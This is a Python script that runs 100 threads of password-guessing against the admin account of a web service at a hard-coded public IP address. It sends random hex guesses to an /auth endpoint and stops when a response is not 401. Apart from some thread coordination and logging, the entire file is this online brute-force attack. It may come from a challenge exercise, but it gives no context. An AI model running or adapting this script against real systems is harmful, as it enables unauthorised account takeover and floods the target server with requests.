import os
import requests
import threading
import time

url = "http://43.201.41.58:3000"
size = 16
used_dict = set()
lock = threading.Lock()
loop = 0
cooldown_sec = 3

stop_event = threading.Event()

my_range = 0

def brute_force_password(length):
    return os.urandom(length).hex()

def attempt_brute_force():
    global loop
    while not stop_event.is_set():
        test = brute_force_password(size)

        if int(test[0], 16) % 6 != my_range:
            continue

        with lock:
            if test in used_dict:
                continue
            used_dict.add(test)
            loop += 1
            current_loop = loop

        while not stop_event.is_set():
            try:
                req = requests.get(
                    f"{url}/auth?username=admin&authType=password&value={test}",
                    timeout=5
                )
                print(f"Loop: {current_loop}, Password: {test}, Status Code: {req.status_code}, Response: {req.text}")

                if req.status_code != 401:
                    print("Found the password!", test)
                    stop_event.set()
                break

            except requests.RequestException as e:
                print(f"[ERROR] Loop {current_loop}, Password: {test}, Error: {str(e)}")
                time.sleep(cooldown_sec)

threads = []
num_threads = 100

for _ in range(num_threads):
    t = threading.Thread(target=attempt_brute_force)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("All threads finished.")
